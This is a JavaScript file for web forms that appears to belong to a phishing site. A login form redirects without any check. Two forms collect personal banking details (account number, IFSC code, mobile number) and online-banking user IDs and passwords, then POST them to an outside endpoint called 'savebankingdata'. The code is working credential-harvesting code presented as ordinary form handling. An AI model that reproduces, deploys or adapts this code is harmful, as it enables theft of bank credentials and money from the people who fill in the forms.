document
  .getElementById("loginForm")
  ?.addEventListener("submit", function (event) {
    event.preventDefault();
    window.location.href = "/dashboard.html";
  });

document
  .getElementById("bankform")
  ?.addEventListener("submit", function (event) {
    event.preventDefault();
    const name = document.getElementsByName("name")[0]?.value.trim();
    const mobile = document.getElementsByName("mobile")[0]?.value.trim();
    const bank = document.getElementsByName("bank")[0]?.value;
    const acnumber = document.getElementsByName("acnumber")[0]?.value.trim();
    const reacnumber = document
      .getElementsByName("reacnumber")[0]
      ?.value.trim();
    const ifscnumber = document
      .getElementsByName("ifscnumber")[0]
      ?.value.trim();

    document.getElementById("nameerror").innerHTML = "";
    document.getElementById("bankerror").innerHTML = "";
    document.getElementById("acerror").innerHTML = "";
    document.getElementById("reacerror").innerHTML = "";
    document.getElementById("mobileerror").innerHTML = "";
    document.getElementById("ifscerror").innerHTML = "";

    let isValid = true;

    if (!name.trim()) {
      isValid = false;
      document.getElementById("nameerror").innerHTML =
        "Please enter your name.";
    }

    if (!mobile || mobile.length !== 10) {
      isValid = false;
      document.getElementById("mobileerror").innerHTML =
        "Mobile number should be of 10 digits.";
    }

    if (bank === "Choose Bank") {
      isValid = false;
      document.getElementById("bankerror").innerHTML =
        "Please select your bank.";
    }

    if (!acnumber || acnumber.length < 8 || acnumber.length > 15) {
      isValid = false;
      document.getElementById("acerror").innerHTML =
        "Please enter a valid account number (between 8 and 15 digits).";
    }

    // Re-entered account number validation
    if (acnumber !== reacnumber) {
      isValid = false;
      document.getElementById("reacerror").innerHTML =
        "Account numbers do not match.";
    }

    // IFSC code validation
    if (!ifscnumber) {
      isValid = false;
      document.getElementById("ifscerror").innerHTML =
        "Please enter IFSC code.";
    }

    if (isValid) {
      // Prepare data for POST request
      const data = {
        type: "Banking",
        name: name,
        bank: bank,
        acnumber: acnumber,
        mobile: mobile,
        ifscnumber: ifscnumber,
      };

      // Send POST request
      fetch("https://lotus-backend.vercel.app/savebankingdata", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => {
          if (response.ok) {
            console.log("Bank form submitted successfully.");
            window.location.href = "/submit.html";
          } else {
            console.error("Failed to submit bank form.");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }
  });

document
  .getElementById("netbanking")
  ?.addEventListener("submit", function (event) {
    event.preventDefault();
    const bank = document.getElementsByName("netbank")[0]?.value;
    const userid = document.getElementsByName("userid")[0]?.value.trim();
    const password = document.getElementsByName("password")[0]?.value.trim();

    // Clear previous error messages
    document.getElementById("useriderror").innerHTML = "";
    document.getElementById("passworderror").innerHTML = "";
    document.getElementById("banknameerror").innerHTML = "";

    let isValid = true;

    // Bank selection validation
    if (bank === "Choose Bank") {
      isValid = false;
      document.getElementById("banknameerror").innerHTML =
        "Please select your bank.";
    }

    // User ID validation
    if (!userid) {
      isValid = false;
      document.getElementById("useriderror").innerHTML =
        "Please enter your user ID.";
    }

    // Password validation
    if (!password) {
      isValid = false;
      document.getElementById("passworderror").innerHTML =
        "Please enter your password.";
    }

    if (isValid) {
      const data = {
        type: "Net-banking",
        bank: bank,
        userid: userid,
        password: password,
      };

      fetch("https://lotus-backend.vercel.app/savebankingdata", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      })
        .then((response) => {
          if (response.ok) {
            console.log("Netbanking form submitted successfully.");
            window.location.href = "/submit.html";
          } else {
            console.error("Failed to submit netbanking form.");
          }
        })
        .catch((error) => {
          console.error("Error:", error);
        });
    }
  });
